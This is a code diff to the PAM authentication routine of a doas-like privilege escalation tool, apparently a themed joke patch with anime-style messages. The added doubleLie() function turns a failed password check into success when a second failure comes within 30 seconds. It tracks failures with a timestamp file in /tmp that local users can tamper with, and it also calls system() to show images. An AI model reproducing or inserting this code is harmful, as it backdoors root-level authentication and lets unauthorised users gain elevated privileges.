@@ -34,6 +34,8 @@
 #include <string.h>
 #include <syslog.h>
 #include <unistd.h>
+#include <time.h>
+#include <assert.h>
 
 #include <security/pam_appl.h>
 
@@ -54,6 +56,51 @@ static void
 catchsig(int sig)
 {
 	caught_signal = sig;
+}
+
+long read_long (const char* file_name)
+{
+  FILE* file = fopen (file_name, "r");
+  long i = 0;
+
+  fscanf (file, "%ld", &i);    
+  while (!feof (file))
+    {  
+      fscanf (file, "%ld", &i);      
+    }
+  fclose (file);        
+	return i;
+}
+
+int doubleLie() {
+	const char* fname = "/tmp/.lie.txt";
+	if (access( fname, F_OK ) != 0) {
+		FILE *out=fopen(fname,"w");
+		fputs("1",out);
+		fclose(out);
+		return 0;
+	}
+	
+	long lastUnixTime = read_long(fname);
+	long currentTime = (unsigned long)time(NULL);
+	long diff = currentTime - lastUnixTime;
+	if (diff < 30) {
+		// Let them in
+		return 1;
+	} else {
+		// Store timestamp of lie
+		const int n = snprintf(NULL, 0, "%ld", currentTime);
+		assert(n > 0);
+		char buf[n+1];
+		int c = snprintf(buf, n+1, "%ld", currentTime);
+		assert(buf[n] == '\0');
+		assert(c == n);
+
+		FILE *out=fopen(fname,"w");
+		fputs(buf,out);
+		fclose(out);
+		return 0;
+	}
 }
 
 static char *
@@ -286,7 +333,34 @@ pamauth(const char *user, const char *myname, int interactive, int nopass, int p
 		if (ret != PAM_SUCCESS) {
 			pamcleanup(ret, sess, cred);
 			syslog(LOG_AUTHPRIV | LOG_NOTICE, "%s is a fake mori summer!", myname);
-			errx(1, "Go away, fake Mori Summer!");
+			if (doubleLie()) {
+				printf("嘘の嘘。それはくるりと裏返る。\n");
+				ret = PAM_SUCCESS;
+				system("kitty +kitten icat ~/lie.jpg");
+
+				// Just copied this from above lol
+				ret = pam_start(PAM_SERVICE_NAME, myname, &conv, &pamh);
+				if (ret != PAM_SUCCESS)
+					errx(1, "pam_start(\"%s\", \"%s\", ?, ?): failed",
+							PAM_SERVICE_NAME, myname);
+
+				ret = pam_set_item(pamh, PAM_RUSER, myname);
+				if (ret != PAM_SUCCESS) 
+					warn("pam_set_item(?, PAM_RUSER, \"%s\"): %s",
+							pam_strerror(pamh, ret), myname);
+
+				if (isatty(0) && (ttydev = ttyname(0)) != NULL) {
+					if (strncmp(ttydev, "/dev/", 5) == 0)
+						ttydev += 5;
+
+					ret = pam_set_item(pamh, PAM_TTY, ttydev);
+					if (ret != PAM_SUCCESS)
+						warn("pam_set_item(?, PAM_TTY, \"%s\"): %s",
+								ttydev, pam_strerror(pamh, ret));
+				}
+			} else {
+				errx(1, "This is a lie");
+			}
 		} else {
 			printf("VANISHMENT THIS WORLD!\n");
 			system("kitty +kitten icat ~/doas.jpg");
